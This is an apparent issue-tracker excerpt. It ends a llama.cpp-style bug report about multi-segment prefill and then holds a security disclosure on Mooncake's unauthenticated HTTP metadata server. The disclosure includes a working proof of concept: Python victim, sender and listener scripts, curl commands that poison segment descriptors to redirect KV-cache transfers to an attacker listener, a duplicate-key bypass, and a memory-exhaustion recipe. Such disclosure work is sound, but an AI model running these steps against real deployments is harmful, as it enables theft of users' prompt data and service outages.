So the boundary is purely **segment count ≥ 2 (or any tokens preceding the first segment)** — content and length are irrelevant. Since the first sampled token is already wrong, this looks like a prefill-path bug for multi-segment inputs (PLE n-gram history / indexer state across segment boundaries?).

On the chat endpoint this means any multi-message conversation degenerates, while single-turn works — which also explains why template variations (system blocks etc.) make it look random. Workaround we use: a custom chat template that folds system text + tools into the first user turn, keeping the prompt single-segment. Thinking mode then works fine for single-turn.

### Gotcha: OOM-killed server leaves the GPU in a bad state

After `llama-server` gets OOM-killed (or `pkill -9`), the GPU enters a state where **every** subsequent run — any binary, any prompt, including previously-clean single-segment repros — outputs only `/`. This silently poisons triage: results look non-deterministic when they aren't. A function-level reset restores it without rebooting:

```
echo 1 | sudo tee /sys/class/drm/card1/device/reset
```

(Context if it matters: this machine already runs `amdgpu.cwsr_enable=0` on the cmdline from an earlier ring-timeout issue.)

### Question

Is multi-segment prefill known / on the roadmap? Happy to test any patch — the repro above is fully deterministic on my end.

items.title: [Bug]: Unauthenticated Mooncake HTTP metadata server allows segment descriptor poisoning and KV transfer redirection
items.author: yyymk
items.body_excerpt:
### Bug Report

### Summary

The HTTP metadata server shipped in the mooncake wheel serves GET/PUT/DELETE on `/metadata` without any authentication. A network peer can read every engine's segment descriptor (absolute buffer addresses and data ports), overwrite a victim engine's descriptor to redirect live KV transfers to an attacker-controlled listener while the sender reports success, rewrite `rpc_meta` entries by bypassing the duplicate-key check with DELETE, delete cluster metadata to break new transfers, and grow the server's memory without bound. Runtime-confirmed with the `mooncake.http_metadata_server` component of mooncake-transfer-engine 0.3.11.post1; the same unauthenticated handler still ships in the 0.3.13 wheel and on the main branch as `mooncake-transfer-engine/example/http-metadata-server-python/bootstrap_server.py`. No fix available. Suggested severity: High, CVSS 8.8.

### Details

`mooncake/http_metadata_server.py` (started via `python -m mooncake.http_metadata_server`, default bind 0.0.0.0:8080) is the documented HTTP backend for `TransferEngine` metadata, used as the etcd alternative via a conn string like `http://host:28080/metadata` (`HTTPStoragePlugin` in src/transfer_metadata_plugin.cpp).

The handlers are plain key/value operations with no authentication and no authorization:

- `GET /metadata?key=mooncake/ram/<name>` returns the engine's segment descriptor, including `buffers[].addr` (absolute process addresses), `tcp_data_port`, and RDMA rkeys.
- `PUT` overwrites any segment descriptor. The only integrity check in the file is a duplicate-key rejection for `rpc_meta` keys - and `DELETE` removes the key first, so `DELETE` + `PUT` rewrites `mooncake/rpc_meta/<name>` (the handshake RPC location) without restriction.
- `DELETE` removes any key. Request bodies are read fully into memory and the store dict has no size or key-count limit (aiohttp's default `client_max_size` of 1 MB rejects one huge body, many smaller keys bypass it).

The data plane trusts these values. `TcpTransport::startTransfer` connects to the IP from `rpc_meta` plus `tcp_data_port` from the segment descriptor, with no validation that the descriptor is authentic. After `tcp_data_port` is poisoned, a normal `transfer_sync_write` sends the payload to the attacker's listener. The sender still reports success: the client session completes once the payload is written to the socket and the server side acknowledges nothing.

### PoC

Environment: Linux x86_64, Python 3.11, `pip install mooncake-transfer-engine==0.3.11.post1` on two shells of one host (use the host IP 192.168.105.123 below). Terminal 1 starts the server:

```bash
MC_FORCE_TCP=1 python -m mooncake.http_metadata_server --port 28080
```

Terminal 2 runs the receiving victim:

```python
# victim_a.py
import ctypes, time
from mooncake.engine import TransferEngine

buf = ctypes.create_string_buffer(65536)
te = TransferEngine()
te.initialize("va", "http://192.168.105.123:28080/metadata", "tcp", "")
te.register_memory(ctypes.addressof(buf), 65536)
print("va_addr =", ctypes.addressof(buf), flush=True)
time.sleep(7200)
```

Terminal 3 is the attacker listener:

```python
# listener.py
import socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("192.168.105.123", 39999))
s.listen(1)
c, _ = s.accept()
data = b""
while True:
    chunk = c.recv(65536)
    if not chunk:
        break
    data += chunk
print(len(data), data[:96])   # 88 bytes: 24-byte header (includes target absolute address) + payload
```

Sender, run as a fresh process each round (the segment descriptor is cached per process):

```python
# sender.py
import ctypes
from mooncake.engine import TransferEngine

payload = ctypes.create_string_buffer(b"SECRET_KV_" + b"S" * 54, 64)
te = TransferEngine()
te.initialize("vb", "http://192.168.105.123:28080/metadata", "tcp", "")
ret = te.transfer_sync_write("va", ctypes.addressof(payload), VA_ADDR, 64)  # VA_ADDR printed by victim_a
print("transfer returned", ret)
```

Control round: run `sender.py` once; it prints `transfer returned 0` and victim A's buffer now starts with `SECRET_KV_`.

Attack round:

```bash
# 1. read the victim's descriptor, no credentials
curl "http://192.168.105.123:28080/metadata?key=mooncake/ram/va"
# 2. save that JSON, change only "tcp_data_port" to 39999, put it back
curl -X PUT --data-binary @va_poisoned.json "http://192.168.105.123:28080/metadata?key=mooncake/ram/va"
# 3. run sender.py again as a fresh process
```

Observed: the sender prints `transfer returned 0`, the listener prints 88 bytes consisting of the 24-byte protocol header (including the target absolute address) followed by the 64-byte `SECRET_KV_...` payload, and victim A's buffer is unchanged - the payload was exfiltrated with neither endpoint reporting an error.

rpc_meta duplicate-check bypass:

```bash
curl -X PUT --data '{"ip_or_host_name":"8.8.8.8","rpc_port":9}' "http://192.168.105.123:28080/metadata?key=mooncake%2Frpc_meta%2Fva"   # 400 Duplicate rpc_meta key not allowed
curl -X DELETE "http://192.168.105.123:28080/metadata?key=mooncake%2Frpc_meta%2Fva"                                                 # 200
curl -X PUT --data '{"ip_or_host_name":"8.8.8.8","rpc_port":9}' "http://192.168.105.123:28080/metadata?key=mooncake%2Frpc_meta%2Fva" # 200
curl "http://192.168.105.123:28080/metadata?key=mooncake%2Frpc_meta%2Fva"                                                           # {"ip_or_host_name":"8.8.8.8","rpc_port":9}
```

Resource exhaustion: `PUT` a 900 KB body to 2800 distinct keys; the server process RSS grew from 39 MB to about 2.5 GB.

### Impact

This is a missing-authorization issue (CWE-306) on the cluster metadata control plane. The attacker needs no credentials, only reachability of the metadata server port, which is a fixed, operator-chosen port bound on all interfaces by default.

Confidentiality: KV cache data (user prompts and context) is exfiltrated to an attacker-controlled listener while both end
